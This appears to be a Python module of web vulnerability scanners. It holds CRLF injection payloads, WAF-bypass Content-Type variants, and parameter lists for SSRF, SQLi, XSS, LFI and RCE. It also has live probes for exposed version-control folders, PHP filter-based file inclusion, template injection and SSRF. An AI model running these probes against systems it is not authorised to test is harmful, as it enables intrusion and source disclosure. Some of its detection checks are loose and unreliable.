#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import asyncio
import aiohttp
import re
from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class VulnIntelligence:
    """
    Refactored vulnerability scanners from Artemis.
    Focuses on web application vulnerabilities and misconfigurations.
    """

    @staticmethod
    def generate_crlf_payloads() -> List[str]:
        """
        Generates CRLF injection payloads.
        Ported from 0xSojalSec-crlfmap.
        """
        return [
            "%0AInjected-Header:CRLFInject",
            "%0DInjected-Header:CRLFInject",
            "%0D%0AInjected-Header:CRLFInject",
            "%E5%98%8A%E5%98%8DInjected-Header:CRLFInject",
            "%3F%0AInjected-Header:CRLFInject",
            "\r\nInjected-Header:CRLFInject",
        ]

    @staticmethod
    def generate_content_type_bypasses(original_ct: str) -> List[str]:
        """
        Generates unusual Content-Type variations to bypass WAFs or filter logic.
        Ported from 0xSojalSec-content-type-research.
        """
        if "json" in original_ct.lower():
            return [
                "application/json",
                "application/json,text/html",
                "application/json; charset=utf-8",
                "application/x-javascript+json",
                "application/json+xml",
                "application/json XXX",
                "application/json;inject",
                "application/vnd.api+json",
            ]
        return [original_ct]

    def get_vulnerable_params(self) -> Dict[str, List[str]]:
        """
        Returns a mapping of vulnerability types to common parameter names.
        Ported from 0xSojalSec-Bambdas (OWASP Top 25).
        """
        return {
            "ssrf": [
                "dest",
                "redirect",
                "uri",
                "path",
                "continue",
                "url",
                "window",
                "next",
                "data",
                "reference",
                "site",
                "html",
                "val",
                "validate",
                "domain",
                "callback",
                "return",
                "page",
                "feed",
                "host",
                "port",
                "to",
                "out",
                "view",
                "dir",
            ],
            "sql": [
                "id",
                "page",
                "report",
                "dir",
                "search",
                "category",
                "file",
                "class",
                "url",
                "news",
                "item",
                "menu",
                "lang",
                "name",
                "ref",
                "title",
                "view",
                "topic",
                "thread",
                "type",
                "date",
                "form",
                "main",
                "nav",
                "region",
            ],
            "xss": [
                "q",
                "s",
                "search",
                "id",
                "lang",
                "keyword",
                "query",
                "page",
                "keywords",
                "year",
                "view",
                "email",
                "type",
                "name",
                "p",
                "month",
                "image",
                "list_type",
                "url",
                "terms",
                "categoryid",
                "key",
                "l",
                "begindate",
                "enddate",
            ],
            "lfi": [
                "cat",
                "dir",
                "action",
                "board",
                "date",
                "detail",
                "file",
                "download",
                "path",
                "folder",
                "prefix",
                "include",
                "page",
                "inc",
                "locate",
                "show",
                "doc",
                "site",
                "type",
                "view",
                "content",
                "document",
                "layout",
                "mod",
                "conf",
            ],
            "open_redirect": [
                "next",
                "url",
                "target",
                "rurl",
                "dest",
                "destination",
                "redir",
                "redirect_uri",
                "redirect_url",
                "redirect",
                "out",
                "view",
                "to",
                "image_url",
                "go",
                "return",
                "returnTo",
                "return_to",
                "checkout_url",
                "continue",
                "return_path",
            ],
            "rce": [
                "cmd",
                "exec",
                "command",
                "execute",
                "ping",
                "query",
                "jump",
                "code",
                "reg",
                "do",
                "func",
                "arg",
                "option",
                "load",
                "process",
                "step",
                "read",
                "feature",
                "exe",
                "module",
                "payload",
                "run",
                "print",
            ],
        }

    GIT_MAGIC = re.compile(r"^(ref:.*|[0-9a-f]{40}$)")
    LFI_PAYLOAD = "php://filter/convert.base64-encode/resource="
    B64_PHP_START = re.compile(r".*(PD9waHA|PD9QSFA|PCFET0NUWVBFIEhUTUw\+|PGh0bWw\+).*")

    @classmethod
    async def scan_vcs(cls, url: str) -> List[str]:
        """Detect exposed Version Control Systems (.git, .svn, .hg)."""
        found = []
        checks = [
            ("git", ".git/HEAD", cls.GIT_MAGIC),
            ("svn", ".svn/wc.db", re.compile(r"^SQLite")),
            ("hg", ".hg/store/00manifest.i", re.compile(r"^\x00\x00\x00\x01")),
        ]

        async with aiohttp.ClientSession() as session:
            for name, path, pattern in checks:
                try:
                    target = f"{url.rstrip('/')}/{path}"
                    async with session.get(
                        target, timeout=aiohttp.ClientTimeout(total=5), allow_redirects=False
                    ) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            if pattern.search(text.strip()):
                                found.append(name)
                except (asyncio.TimeoutError, aiohttp.ClientError):
                    continue
        return found

    @classmethod
    async def scan_php_lfi(cls, url: str) -> List[str]:
        """
        Check for PHP LFI by attempting to encode the file itself in base64.
        Expects a URL like http://example.com/index.php?page=
        """
        confirmed = []
        # Artemis logic: find candidate params like ?page=, ?file=
        # For simplicity, we assume the user provides the base URL.
        # Here we just implement the verification logic.

        test_params = ["page", "file", "include", "view", "content", "path"]
        base_path = url.split("?")[0]

        async with aiohttp.ClientSession() as session:
            for param in test_params:
                # Try to include the current script (guessing index.php if not in url)
                filename = "index"
                if ".php" in url:
                    filename = url.split("/")[-1].split(".php")[0]

                test_url = f"{base_path}?{param}={cls.LFI_PAYLOAD}{filename}"
                try:
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        if resp.status == 200:
                            text = (await resp.text()).replace("\n", "")
                            if cls.B64_PHP_START.match(text):
                                confirmed.append(test_url)
                except (asyncio.TimeoutError, aiohttp.ClientError):
                    continue
        return confirmed

    @classmethod
    async def parse_robots(cls, url: str) -> Dict[str, List[str]]:
        """Parse robots.txt and identify high-value paths."""
        results: Dict[str, List[str]] = {"disallowed": [], "sensitive": []}
        async with aiohttp.ClientSession() as session:
            try:
                target = f"{url.rstrip('/')}/robots.txt"
                async with session.get(target, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        for line in content.splitlines():
                            if line.lower().startswith("disallow:"):
                                path = line.split(":", 1)[1].strip()
                                if path and "*" not in path:
                                    results["disallowed"].append(path)
                                    # Flag sensitive looking paths
                                    keywords = ["admin", "config", "backup", "db", "sql", "git"]
                                    if any(kw in path.lower() for kw in keywords):
                                        results["sensitive"].append(path)
            except (asyncio.TimeoutError, aiohttp.ClientError):
                pass
        return results

    @classmethod
    async def scan_ssti(cls, url: str) -> List[str]:
        """
        Check for Server-Side Template Injection using standard math payloads.
        Injected into URL parameters.
        """
        # Math payloads for different engines (Jinja2, Mako, Twig, etc.)
        payloads = ["{{7*7}}", "{{7+7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
        confirmed = []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return []

        async with aiohttp.ClientSession() as session:
            for param_name in params:
                for payload in payloads:
                    new_params = params.copy()
                    new_params[param_name] = [payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))

                    try:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            if resp.status == 200:
                                text = await resp.text()
                                if "49" in text or "14" in text:
                                    confirmed.append(test_url)
                                    break
                    except (asyncio.TimeoutError, aiohttp.ClientError):
                        continue
        return confirmed

    @classmethod
    async def scan_ssrf(cls, url: str, callback_host: str) -> List[str]:
        """
        Check for SSRF by injecting a callback host (e.g., collaborator or local IP).
        """
        payloads = [callback_host, f"http://{callback_host}", f"https://{callback_host}"]
        confirmed = []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return []

        async with aiohttp.ClientSession() as session:
            for param_name in params:
                for payload in payloads:
                    new_params = params.copy()
                    new_params[param_name] = [payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))

                    try:
                        # For SSRF we usually need to check the callback listener logs,
                        # but we can look for change in response.
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            # A 200 OK when requesting an internal host might be an indicator
                            if resp.status == 200:
                                confirmed.append(f"Potential SSRF indicator on {param_name}: {test_url}")
                    except (asyncio.TimeoutError, aiohttp.ClientError):
                        continue
        return confirmed
